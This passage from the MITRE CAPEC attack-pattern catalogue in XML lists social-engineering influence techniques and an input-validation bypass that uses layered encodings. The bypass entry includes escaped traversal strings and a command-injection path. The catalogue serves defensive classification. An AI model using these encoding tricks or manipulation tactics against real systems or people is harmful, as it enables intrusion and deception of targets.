               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, Related_Attack_Patterns, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Perception of Authority</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="422" Name="Influence Perception of Commitment and Consistency" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses social engineering to convince the target to do minor tasks as opposed to larger actions. After complying with a request, individuals are more likely to agree to subsequent requests that are similar in type and required effort.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="417"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.</xhtml:p>
               <xhtml:p>Individuals should avoid complying with suspicious requests.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Related_Attack_Patterns, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Perception of Commitment and Consistency</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="423" Name="Influence Perception of Liking" Abstraction="Detailed" Status="Stable">
         <Description>The adversary influences the target's actions by building a relationship where the target has a liking to the adversary. People are more likely to be influenced by people of whom they are fond, so the adversary attempts to ingratiate his or herself with the target via actions, appearance, or a combination thereof.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="417"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the types of things that the target likes.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Attacks that leverage the principle of liking can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Related_Attack_Patterns, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Perception of Liking</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="424" Name="Influence Perception of Consensus or Social Proof" Abstraction="Detailed" Status="Draft">
         <Description>The adversary influences the target's actions by leveraging the inherent human nature to assume behavior of others is appropriate. In situations of uncertainty, people tend to behave in ways they see others behaving. The adversary convinces the target of adopting behavior or actions that is advantageous to the adversary.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="417"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Attacks that leverage the principle of liking can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Related_Attack_Patterns, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Perception of Consensus or Social Proof</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="425" Name="Target Influence via Framing" Abstraction="Standard" Status="Draft">
         <Description>An adversary uses framing techniques to contextualize a conversation so that the target is more likely to be influenced by the adversary's point of view. Framing is information and experiences in life that alter the way we react to decisions we must make. This type of persuasive technique exploits the way people are conditioned to perceive data and its significance, while avoiding negative or avoidance responses from the target. Rather than a specific technique framing is a methodology of conversation that slowly encourages the target to adopt to the adversary's perspective. One technique of framing is to avoid the use of the word "No" and to contextualize responses in a manner that is positive. When performed skillfully the target is much more likely to volunteer information or perform actions favorable to the adversary.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="416"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Successful attacks that influence the target via framing into performing an action or sharing sensitive information can result in a variety of consequences that negatively affect the confidentiality of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>
               <xhtml:p>An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.</xhtml:p>
               <xhtml:p>Avoid sharing unnecessary information during interactions beyond what is absolutely required for effective communication.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="426" Name="Influence via Incentives" Abstraction="Standard" Status="Stable">
         <Description>The adversary incites a behavior from the target by manipulating something of influence. This is commonly associated with financial, social, or ideological incentivization. Examples include monetary fraud, peer pressure, and preying on the target's morals or ethics. The most effective incentive against one target might not be as effective against another, therefore the adversary must gather information about the target's vulnerability to particular incentives.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="416"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the incentives that would influence the actions of the specific target.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Attacks that successfully incentivize the target into performing an action beneficial to the adversary can result in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Manipulation of Incentives</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="427" Name="Influence via Psychological Principles" Abstraction="Standard" Status="Draft">
         <Description>The adversary shapes the target's actions or behavior by focusing on the ways human interact and learn, leveraging such elements as cognitive and social psychology. In a variety of ways, a target can be influenced to behave or perform an action through capitalizing on what scholarship and research has learned about how and why humans react to specific scenarios and cues.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="416"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the means and knowledge of how to communicate with the target in some manner.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires strong inter-personal and communication skills.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Attacks that successfully influence the target into performing an action via psychological principles can result in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Psychological Principles</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="428" Name="Influence via Modes of Thinking" Abstraction="Detailed" Status="Draft">
         <Description>The adversary tailors their communication to the language and thought patterns of the target thereby weakening barriers or reluctance to communication. This method is a way of building rapport with a target by matching their speech patterns and the primary ways or dominant senses with which they make abstractions. This technique can be used to make the target more receptive to sharing information because the adversary has adapted their communication forms to match those of the target. When skillfully employed, the target is likely to be unaware that they are being manipulated.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="427"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Target Influence via Modes of Thinking</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="429" Name="Target Influence via Eye Cues" Abstraction="Detailed" Status="Draft">
         <Description>The adversary gains information via non-verbal means from the target through eye movements.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="427"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="43" Name="Exploiting Multiple Input Interpretation Layers" Abstraction="Detailed" Status="Draft">
         <Description>An attacker supplies the target software with input data that contains sequences of special characters designed to bypass input validation logic. This exploit relies on the target making multiples passes over the input data and processing a "layer" of special characters with each pass. In this manner, the attacker can disguise input that would otherwise be rejected as invalid by concealing it with layers of special/escape characters that are stripped off by subsequent processing steps. The goal is to first discover cases where the input validation layer executes before one or more parsing layers. That is, user input may go through the following logic in an application: &lt;parser1&gt; --&gt; &lt;input validator&gt; --&gt; &lt;parser2&gt;. In such cases, the attacker will need to provide input that will pass through the input validator, but after passing through parser2, will be converted into something that the input validator was supposed to stop.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine application/system inputs where bypassing input validation is desired] The attacker first needs to determine all of the application's/system's inputs where input validation is being performed and where he/she wants to bypass it.</Description>
               <Technique>While using an application/system, the attacker discovers an input where validation is stopping him/her from performing some malicious or unauthorized actions.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine which character encodings are accepted by the application/system] The attacker then needs to provide various character encodings to the application/system and determine which ones are accepted. The attacker will need to observe the application's/system's response to the encoded data to determine whether the data was interpreted properly.</Description>
               <Technique>Determine which escape characters are accepted by the application/system. A common escape character is the backslash character, '\'</Technique>
               <Technique>Determine whether URL encoding is accepted by the application/system.</Technique>
               <Technique>Determine whether UTF-8 encoding is accepted by the application/system.</Technique>
               <Technique>Determine whether UTF-16 encoding is accepted by the application/system.</Technique>
               <Technique>Determine if any other encodings are accepted by the application/system.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Combine multiple encodings accepted by the application.] The attacker now combines encodings accepted by the application. The attacker may combine different encodings or apply the same encoding multiple times.</Description>
               <Technique>Combine same encoding multiple times and observe its effects. For example, if special characters are encoded with a leading backslash, then the following encoding may be accepted by the application/system: "\\\.". With two parsing layers, this may get converted to "\." after the first parsing layer, and then, to "." after the second. If the input validation layer is between the two parsing layers, then "\\\.\\\." might pass a test for ".." but still get converted to ".." afterwards. This may enable directory traversal attacks.</Technique>
               <Technique>Combine multiple encodings and observe the effects. For example, the attacker might encode "." as "\.", and then, encode "\." as "&amp;#92;&amp;#46;", and then, encode that using URL encoding to "%26%2392%3B%26%2346%3B"</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Leverage ability to bypass input validation] Attacker leverages his ability to bypass input validation to gain unauthorized access to system. There are many attacks possible, and a few examples are mentioned here.</Description>
               <Technique>Gain access to sensitive files.</Technique>
               <Technique>Perform command injection.</Technique>
               <Technique>Perform SQL injection.</Technique>
               <Technique>Perform XSS attacks.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>User input is used to construct a command to be executed on the target system or as part of the file name.</Prerequisite>
            <Prerequisite>Multiple parser passes are performed on the data supplied by the user.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Knowledge of various escaping schemes, such as URL escape encoding and XML escape characters.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>Control characters are being detected by the filters repeatedly.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>An iterative approach to input validation may be required to ensure that no dangerous characters are present. It may be necessary to implement redundant checking across different input validation layers. Ensure that invalid data is rejected as soon as possible and do not continue to work with it.</Mitigation>
            <Mitigation>Make sure to perform input validation on canonicalized data (i.e. data that is data in its most standard form). This will help avoid tricky encodings getting past the filters.</Mitigation>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Using Escapes</xhtml:div>
               <xhtml:p>The backslash character provides a good example of the multiple-parser issue. A backslash is used to escape characters in strings, but is also used to delimit directories on the NT file system. When performing a command injection that includes NT paths, there is usually a need to "double escape" the backslash. In some cases, a quadruple escape is necessary.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">Original String: C:\\\\winnt\\\\system32\\\\cmd.exe /c<xhtml:br/>
                  <xhtml:br/>&lt;parsing layer&gt;<xhtml:br/>
                  <xhtml:br/>Interim String: C:\\winnt\\system32\\cmd.exe /c<xhtml:br/>
                  <xhtml:br/>&lt;parsing layer&gt;<xhtml:br/>
                  <xhtml:br/>Final String: C:\winnt\system32\cmd.exe /c</xhtml:div>
               <xhtml:p>This diagram shows each successive layer of parsing translating the backslash character. A double backslash becomes a single as it is parsed. By using quadruple backslashes, the attacker is able to control the result in the final string.</xhtml:p>
               <xhtml:p>[R.43.1][REF-2]</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="179"/>
            <Related_Weakness CWE_ID="181"/>
            <Related_Weakness CWE_ID="184"/>
            <Related_Weakness CWE_ID="183"/>
            <Related_Weakness CWE_ID="77"/>
            <Related_Weakness CWE_ID="78"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Description, Description Summary, References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="433" Name="Target Influence via The Human Buffer Overflow" Abstraction="Detailed" Status="Draft">
         <Description>An attacker utilizes a technique to insinuate commands to the subconscious mind of the target via communication patterns. The human buffer overflow methodology does not rely on over-stimulating the mind of the target, but rather embedding messages within communication that the mind of the listener assembles at a subconscious level. The human buffer-overflow method is similar to subconscious programming to the extent that messages are embedded within the message. The fundamental difference is that embedded messages have a complete semantic quality, rather than mere imagery, and the mind of the target tends to key off of particular dominant patterns. The remaining information, carefully structured, speaks directly to the subconscious with a subtle, indirect, command. The effect is to produce a pattern of thinking that the attacker has predetermined but is buried within the message and not overtly stated. Structuring a human "buffer overflow" requires precise attention to detail and the use of information in a manner that distracts the conscious mind from the message the subconscious is receiving.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="427"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="434" Name="Target Influence via Interview and Interrogation" Abstraction="Detailed" Status="Draft">
         <Description/>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="427"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="435" Name="Target Influence via Instant Rapport" Abstraction="Detailed" Status="Draft">
         <Description/>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="427"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="438" Name="Modification During Manufacture" Abstraction="Meta" Status="Draft">
         <Description>An attacker modifies a technology, product, or component during a stage in its manufacture for the purpose of carrying out an attack against some entity involved in the supply chain lifecycle. There are an almost limitless number of ways an attacker can modify a technology when they are involved in its manufacture, as the attacker has potential inroads to the software composition, hardware design and assembly, firmware, or basic design mechanics. Additionally, manufacturing of key components is often outsourced with the final product assembled by the primary manufacturer. The greatest risk, however, is deliberate manipulation of design specifications to produce malicious hardware or devices. There are billions of transistors in a single integrated circuit and studies have shown that fewer than 10 transistors are required to create malicious functionality.</Description>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1195</Entry_ID>
               <Entry_Name>Supply Chain Compromise</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-379"/>
            <Reference External_Reference_ID="REF-380"/>
            <Reference External_Reference_ID="REF-381"/>
            <Reference External_Reference_ID="REF-382" Section="Section 1. Introduction"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Integrity Modification During Manufacture</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="439" Name="Manipulation During Distribution" Abstraction="Meta" Status="Draft">
         <Description>An attacker undermines the integrity of a product, software, or technology at some stage of the distribution channel. The core threat of modification or manipulation during distribution arise from the many stages of distribution, as a product may traverse multiple suppliers and integrators as the final asset is delivered. Components and services provided from a manufacturer to a supplier may be tampered with during integration or packaging.</Description>
         <Example_Instances>
            <Example>A malicious OEM provider, or OEM provider employee or contractor, may install software, or modify existing code, during distribution.</Example>
            <Example>External contractors involved in the packaging or testing of products or components may install software, or modify existing code, during distribution.</Example>
         </Example_Instances>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1195</Entry_ID>
               <Entry_Name>Supply Chain Compromise</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-379"/>
            <Reference External_Reference_ID="REF-384"/>
            <Reference External_Reference_ID="REF-382" Section="Section 1. Introduction"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Integrity Modification During Distribution</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="44" Name="Overflow Binary Resource File" Abstraction="Detailed" Status="Draft">
         <Description>An attack of this type exploits a buffer overflow vulnerability in the handling of binary resources. Binary resources may include music files like MP3, image files like JPEG files, and any other binary file. These attacks may pass unnoticed to the client machine through normal usage of files, such as a browser loading a seemingly innocent JPEG file. This can allow the attacker access to the execution stack and execute arbitrary code in the target process. This attack pattern is a variant of standard buffer overflow attacks using an unexpected vector (binary files) to wrap its attack and open up a new attack vector. The attacker is required to either directly serve the binary content to the victim, or place it in a locale like a MP3 sharing application, for the victim to download. The attacker then is notified upon the download or otherwise locates the vulnerability opened up by the buffer overflow.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="23"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Target software processes binary resource files.</Prerequisite>
            <Prerequisite>Target software contains a buffer overflow vulnerability reachable through input from a user-controllable binary resource file.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">To modify file, deceive client into downloading, locate and exploit remote stack or heap vulnerability</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
